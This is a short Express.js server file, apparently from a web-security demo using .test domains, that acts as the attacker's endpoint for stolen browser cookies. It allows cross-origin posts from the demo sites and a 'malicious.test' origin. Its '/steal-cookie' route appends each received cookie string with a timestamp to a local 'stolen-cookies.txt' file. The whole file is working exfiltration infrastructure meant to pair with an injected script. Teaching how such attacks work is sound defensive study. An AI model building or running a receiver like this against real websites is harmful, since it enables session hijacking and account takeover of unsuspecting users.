import express from 'express';
import cors from 'cors';
import cookieParser from 'cookie-parser';
import fs from 'fs/promises';

const PORT = 5500;
const app = express();
app.use(express.json());

app.use(
    cors({
        origin: ['https://codersgyan.test', 'https://api.codersgyan.test', 'malicious.test'],
    })
);

app.use(cookieParser());

app.post('/steal-cookie', async (req, res) => {
    try {
        const { cookies } = req.body;
        const stolenCredentials = `${new Date()} \n ${cookies} \n\n`;
        await fs.appendFile('stolen-cookies.txt', stolenCredentials);
        res.json({});
    } catch (error) {
        console.log(error);
    }
});

app.listen(PORT, () => console.log(`Server is running at port ${PORT}`));
